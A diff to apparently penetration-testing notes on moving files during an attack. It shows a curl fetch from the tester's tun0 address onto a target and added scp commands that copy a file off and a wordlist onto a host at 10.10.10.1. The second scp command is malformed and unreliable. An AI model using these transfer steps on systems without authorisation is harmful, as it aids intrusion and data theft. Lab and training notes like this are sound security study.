@@ -102,12 +102,20 @@ curl http://<tun0_ip_here:8000/<file_name_here> <file_name_here>
 * SSH Creds or Key
 * Identify path of file you want with <mark style="color:red;">`pwd`</mark>
 
+Copying a file from a remote system to yours:
+
 ```
 scp user@10.10.10.1:C:/ftp/infrastructure .
 password:
 
 Infrastructure.pdf                                                     100%   45KB 240.7KB/s   00:00    
 
+```
+
+Transfering a file from your system to a remote system:
+
+```
+scp root@10.10.10.1 -i ~/.ssh/id_rsa wordlist.txt /root/wordlists
 ```
 
 
